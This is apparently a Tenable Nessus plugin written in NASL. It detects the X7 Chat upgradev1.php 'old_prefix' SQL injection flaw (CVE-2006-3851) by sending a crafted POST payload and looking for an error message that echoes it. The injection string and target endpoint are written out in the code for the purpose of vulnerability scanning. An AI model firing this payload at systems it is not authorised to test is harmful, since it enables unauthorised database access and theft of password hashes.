#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22090);
  script_version("$Revision: 1.16 $");

  script_cve_id("CVE-2006-3851");
  script_bugtraq_id(19123);
  script_osvdb_id(29408);
  script_xref(name:"EDB-ID", value:"2068");

  script_name(english:"X7 Chat upgradev1.php old_prefix Parameter SQL Injection");
  script_summary(english:"Checks for SQL injection flaw in X7 Chat");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running X7 Chat, a web-based chat program written
in PHP. 

The version of X7 Chat installed on the remote host fails to properly
sanitize input to the 'old_prefix' parameter of the 'upgradev1.php'
script before using it in a database query.  This may allow an
unauthenticated attacker to uncover sensitive information such as
password hashes, modify data, launch attacks against the underlying
database, etc. 

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' setting." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/25");
 script_cvs_date("$Date: 2011/03/12 01:05:18 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2011 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/x7chat", "/chat", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Make sure the affected script exists.
  url = string(dir, "/upgradev1.php");
  r = http_send_recv3(method: "GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does...
  if ("location='upgradev1.php?step=2';" >< res)
  {
    # Try to exploit the flaw to generate an error.
    #
    # nb: while the SQL injection is blind, the app will display
    #     an error if the old_prefix is wrong.
    sploit = string("x7chat2_users/**/WHERE/**/", SCRIPT_NAME, "=1--");
    postdata = string(
      "old_prefix=", sploit, "&",
      "member_accounts=0&",
      "rooms=0&",
      "settings=1&",
      "connvert=0"
    );
    r = http_send_recv3(method: "POST", item: string(url, "?step=3"), version: 11, port: port, add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"), data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];
    # There's a problem if we see an error message with our old_prefix.
    if (string("an error reading ", sploit, "bans.") >< res)
    {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
